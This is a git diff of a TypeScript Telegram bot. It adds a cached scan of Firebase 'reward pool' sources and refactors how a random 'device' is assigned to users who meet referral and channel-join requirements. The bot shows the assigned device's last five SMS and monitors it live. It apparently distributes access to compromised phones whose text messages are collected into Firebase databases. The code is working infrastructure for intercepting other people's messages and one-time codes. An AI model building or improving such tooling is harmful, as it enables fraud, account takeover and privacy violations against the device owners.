@@ -36,12 +36,30 @@ type DeviceMonitor = { active: boolean; timer: ReturnType<typeof setInterval> };
 const monitors = new Map<string, DeviceMonitor>();
 const answeredCallbacks = new WeakSet<object>();
 const MAX_FIREBASE_BATCH = 10;
+const POOL_SCAN_TIMEOUT_MS = 8_000;
+const POOL_CACHE_TTL_MS = 10_000;
 let botUsername = "";
 const IMAGE_SETTING_KEYS = {
   welcome: "welcome_image_file_id",
   access: "access_image_file_id",
   device: "device_image_file_id",
 } as const;
+type PoolSourceSnapshot = {
+  panel: Awaited<ReturnType<typeof getFreeFirebasePanels>>[number];
+  devices: Device[];
+  ok: boolean;
+  error?: string;
+};
+type PoolSnapshot = {
+  sources: PoolSourceSnapshot[];
+  configuredSources: number;
+};
+let poolSnapshotCache: { value: PoolSnapshot; expiresAt: number } | undefined;
+let poolSnapshotPromise: Promise<PoolSnapshot> | undefined;
+
+function invalidatePoolSnapshot() {
+  poolSnapshotCache = undefined;
+}
 
 function userId(ctx: Context): number {
   if (!ctx.from) throw new Error("Missing Telegram user");
@@ -83,7 +101,6 @@ async function baseGuard(ctx: Context): Promise<boolean> {
 
 async function renderAccessGate(ctx: Context, includeImage = false) {
   const id = userId(ctx);
-  if (includeImage) await sendConfiguredImage(ctx, IMAGE_SETTING_KEYS.access);
   const channels = await getRequiredChannels();
   const membership = await checkRequiredChannels(ctx, channels);
   if (membership.allJoined) await qualifyReferral(id);
@@ -95,10 +112,11 @@ async function renderAccessGate(ctx: Context, includeImage = false) {
   const minimum = Number(await getSetting("minimum_referrals", "3"));
   const durationMinutes = Math.max(1, Number(durationValue) || 45);
   const referralLink = botUsername ? `https://t.me/${botUsername}?start=ref_${id}` : undefined;
-  await editOrReply(
+  await editOrReplyWithConfiguredImage(
     ctx,
     accessGateText(stats, minimum, durationMinutes, channels, membership.joined, referralLink, access),
-    accessGateKeyboard(channels, referralLink)
+    accessGateKeyboard(channels, referralLink),
+    includeImage ? IMAGE_SETTING_KEYS.access : undefined
   );
 }
 
@@ -122,13 +140,45 @@ async function editOrReply(ctx: Context, text: string, keyboard?: unknown) {
   await ctx.reply(text, styledKeyboard ? Markup.inlineKeyboard(styledKeyboard.inline_keyboard) : undefined);
 }
 
-async function sendConfiguredImage(ctx: Context, settingKey: string) {
+async function editOrReplyWithConfiguredImage(
+  ctx: Context,
+  text: string,
+  keyboard: unknown,
+  settingKey?: string
+) {
+  if (!settingKey) {
+    await editOrReply(ctx, text, keyboard);
+    return;
+  }
   const fileId = (await getSetting(settingKey, "")).trim();
-  if (!fileId) return;
+  if (!fileId) {
+    await editOrReply(ctx, text, keyboard);
+    return;
+  }
+  const styledKeyboard = premiumizeKeyboard(keyboard) as any;
+  const caption = text.slice(0, 1024);
+  const photoOptions = {
+    caption,
+    ...(styledKeyboard ? { reply_markup: styledKeyboard } : {})
+  } as any;
+
   try {
-    await ctx.replyWithPhoto(fileId);
+    const callbackMessage = "callbackQuery" in ctx ? ctx.callbackQuery?.message : undefined;
+    if (callbackMessage && "photo" in callbackMessage) {
+      await ctx.editMessageCaption(caption, styledKeyboard ? { reply_markup: styledKeyboard } as any : undefined);
+      return;
+    }
+    if (callbackMessage && ctx.chat) {
+      try {
+        await ctx.telegram.deleteMessage(ctx.chat.id, callbackMessage.message_id);
+      } catch {
+        // The message may already have been removed or may be too old to delete.
+      }
+    }
+    await ctx.replyWithPhoto(fileId, photoOptions);
   } catch (error) {
     await logSystem("warn", "configured_image_send_failed", `${settingKey}: ${shortError(error)}`, userId(ctx));
+    await editOrReply(ctx, text, keyboard);
   }
 }
 
@@ -173,15 +223,73 @@ async function allSummary(telegramId: number) {
   return { connections, summaries };
 }
 
+async function readPoolSources(force = false): Promise<PoolSnapshot> {
+  if (!force && poolSnapshotCache && poolSnapshotCache.expiresAt > Date.now()) {
+    return poolSnapshotCache.value;
+  }
+  if (poolSnapshotPromise) return poolSnapshotPromise;
+
+  poolSnapshotPromise = (async () => {
+    const panels = (await getFreeFirebasePanels()).filter(panel => panel.active);
+    const results = await Promise.all(panels.map(async panel => {
+      try {
+        const root = await readFirebase(panel.firebaseUrl, POOL_SCAN_TIMEOUT_MS);
+        return { panel, devices: extractDevices(root), ok: true } satisfies PoolSourceSnapshot;
+      } catch (error) {
+        return {
+          panel,
+          devices: [],
+          ok: false,
+          error: shortError(error)
+        } satisfies PoolSourceSnapshot;
+      }
+    }));
+    const value = { sources: results, configuredSources: panels.length };
+    poolSnapshotCache = { value, expiresAt: Date.now() + POOL_CACHE_TTL_MS };
+    return value;
+  })();
+
+  try {
+    return await poolSnapshotPromise;
+  } finally {
+    poolSnapshotPromise = undefined;
+  }
+}
+
 async function renderHome(ctx: Context, includeImage = false) {
   const id = userId(ctx);
   unselectDevice(id);
   clearSession(id);
-  if (includeImage) await sendConfiguredImage(ctx, IMAGE_SETTING_KEYS.welcome);
-  const { connections, summaries } = await allSummary(id);
-  const devices = [...summaries.values()].reduce((a, s) => ({ total: a.total + s.total, online: a.online + s.online, offline: a.offline + s.offline }), { total: 0, online: 0, offline: 0 });
+  const [{ connections, summaries }, pool] = await Promise.all([
+    allSummary(id),
+    readPoolSources().catch(() => undefined)
+  ]);
+  const userDevices = [...summaries.values()].reduce(
+    (a, s) => ({ total: a.total + s.total, online: a.online + s.online, offline: a.offline + s.offline }),
+    { total: 0, online: 0, offline: 0 }
+  );
+  const poolHasSuccessfulSource = Boolean(pool?.sources.some(source => source.ok));
+  const devices = poolHasSuccessfulSource
+    ? pool!.sources.reduce(
+      (a, source) => {
+        for (const device of source.devices) {
+          a.total++;
+          if (device.status === "online") a.online++;
+          else a.offline++;
+        }
+        return a;
+      },
+      { total: 0, online: 0, offline: 0 }
+    )
+    : userDevices;
+  const sourceCount = poolHasSuccessfulSource ? pool!.configuredSources : connections.length;
   const limit = Number(await getSetting("firebase_limit", "10"));
-  await editOrReply(ctx, homeText({ connections: connections.length, devices }, limit), homeKeyboard(admin(ctx)));
+  await editOrReplyWithConfiguredImage(
+    ctx,
+    homeText({ connections: sourceCount, devices }, limit),
+    homeKeyboard(admin(ctx)),
+    includeImage ? IMAGE_SETTING_KEYS.welcome : undefined
+  );
 }
 
 async function renderFirebaseList(ctx: Context) {
@@ -417,6 +525,7 @@ async function addFreePoolFromText(ctx: Context, text: string) {
     : `Free Firebase ${panels.length + 1}`;
   const url = validateFirebaseUrl(rawUrl);
   await addFreeFirebasePanel(url, displayName);
+  invalidatePoolSnapshot();
   await logSystem("info", "free_firebase_added", `${displayName}: ${url}`, userId(ctx));
   setSession(userId(ctx), { awaiting: undefined });
   await ctx.reply(`✅ Free Firebase added to reward pool.\n\n${displayName}\n${url}`);
@@ -588,39 +697,33 @@ type SelectedPoolDevice = {
 };
 
 async function selectRandomPoolDevice(telegramId: number): Promise<SelectedPoolDevice> {
-  const panels = (await getFreeFirebasePanels()).filter(panel => panel.active);
-  if (!panels.length) throw new Error("Admin has not configured any active Firebase device sources.");
+  const pool = await readPoolSources(true);
+  if (!pool.configuredSources) throw new Error("Admin has not configured any active Firebase device sources.");
 
-  const shuffledPanels = [...panels].sort(() => Math.random() - 0.5);
-  const failures: string[] = [];
-  for (const panel of shuffledPanels) {
-    try {
-      const root = await readFirebase(panel.firebaseUrl);
-      const devices = extractDevices(root);
-      if (!devices.length) {
-        failures.push(`${panel.displayName}: no devices found`);
-        continue;
-      }
-      const online = devices.filter(device => device.status === "online");
-      const candidates = online.length ? online : devices;
-      const device = candidates[Math.floor(Math.random() * candidates.length)];
-      const existing = (await getConnections(telegramId)).find(
-        connection => connection.firebaseUrl === panel.firebaseUrl
-      );
-      const firebaseId = existing?.id ?? await addConnection(telegramId, panel.firebaseUrl, panel.displayName);
-      await replaceDevices(firebaseId, devices);
-      await markConnectionChecked(firebaseId, "connected");
-      return {
-        firebaseId,
-        firebaseUrl: panel.firebaseUrl,
-        sourceName: panel.displayName,
-        device,
-      };
-    } catch (error) {
-      failures.push(`${panel.displayName}: ${shortError(error)}`);
-    }
+  const failures = pool.sources
+    .filter(source => !source.ok || !source.devices.length)
+    .map(source => `${source.panel.displayName}: ${source.error ?? "no devices found"}`);
+  const available = pool.sources.flatMap(source =>
+    source.ok ? source.devices.map(device => ({ panel: source.panel, device, devices: source.devices })) : []
+  );
+  if (!available.length) {
+    throw new Error(`No Firebase source could provide a device.\n\n${failures.slice(0, 3).join("\n")}`);
   }
-  throw new Error(`No Firebase source could provide a device.\n\n${failures.slice(0, 3).join("\n")}`);
+
+  const online = available.filter(candidate => candidate.device.status === "online");
+  const candidates = online.length ? online : available;
+  const selected = candidates[Math.floor(Math.random() * candidates.length)];
+  const existingConnections = await getConnections(telegramId);
+  const existing = existingConnections.find(connection => connection.firebaseUrl === selected.panel.firebaseUrl);
+  const firebaseId = existing?.id ?? await addConnection(telegramId, selected.panel.firebaseUrl, selected.panel.displayName);
+  await replaceDevices(firebaseId, selected.devices);
+  await markConnectionChecked(firebaseId, "connected");
+  return {
+    firebaseId,
+    firebaseUrl: selected.panel.firebaseUrl,
+    sourceName: selected.panel.displayName,
+    device: selected.device,
+  };
 }
 
 async function renderSelectedDevice(ctx: Context, selected: SelectedPoolDevice) {
@@ -632,23 +735,22 @@ async function renderSelectedDevice(ctx: Context, selected: SelectedPoolDevice) 
     monitoring: true,
   });
   startMonitor(id, selected.firebaseId, selected.device);
-  await sendConfiguredImage(ctx, IMAGE_SETTING_KEYS.device);
-  await editOrReply(
+  await editOrReplyWithConfiguredImage(
     ctx,
     deviceDetailText(selected.device, selected.sourceName),
-    deviceDetailKeyboard(selected.firebaseId, selected.device.normalizedDeviceId)
+    deviceDetailKeyboard(selected.firebaseId, selected.device.normalizedDeviceId),
+    IMAGE_SETTING_KEYS.device
   );
 }
 
 async function generateAndRenderDevice(ctx: Context) {
   const id = userId(ctx);
   unselectDevice(id);
+  await answerCallback(ctx, "Selecting a secure device…");
   try {
     const selected = await selectRandomPoolDevice(id);
-    await answerCallback(ctx);
     await renderSelectedDevice(ctx, selected);
   } catch (error) {
-    await answerCallback(ctx, "No device available", { show_alert: true });
     await editOrReply(
       ctx,
       `❌ DEVICE GENERATION FAILED\n\n${shortError(error)}\n\nPlease try again after the admin adds a working Firebase source.`,
@@ -669,6 +771,7 @@ async function renderLastFiveSms(ctx: Context, firebaseId: string, normalized: s
     await answerCallback(ctx, "Device source not found.", { show_alert: true });
     return;
   }
+  await answerCallback(ctx, "Loading latest messages…");
   try {
     const root = await readFirebase(connection.firebaseUrl);
     const device = extractDevices(root).find(item => item.normalizedDeviceId === normalized);
@@ -687,7 +790,6 @@ async function renderLastFiveSms(ctx: Context, firebaseId: string, normalized: s
       .slice(0, 5);
     setSession(id, { screen: "last_sms" });
     startMonitor(id, firebaseId, device);
-    await answerCallback(ctx);
     await editOrReply(ctx, lastSmsText(device, events), lastSmsKeyboard(firebaseId, normalized));
   } catch (error) {
     await answerCallback(ctx, "Unable to read SMS", { show_alert: true });
@@ -1234,6 +1336,7 @@ bot.action("admin_free_pool_add", async ctx => {
 bot.action(/^admin_free_pool_remove:(.+)$/, async ctx => {
   if (!(await guard(ctx)) || !admin(ctx)) return;
   await removeFreeFirebasePanel(ctx.match[1]);
+  invalidatePoolSnapshot();
   await logSystem("info", "free_firebase_removed", `Removed reward pool panel ${ctx.match[1]}`, userId(ctx));
   await answerCallback(ctx, "Free Firebase removed");
   await renderAdminFreePool(ctx);
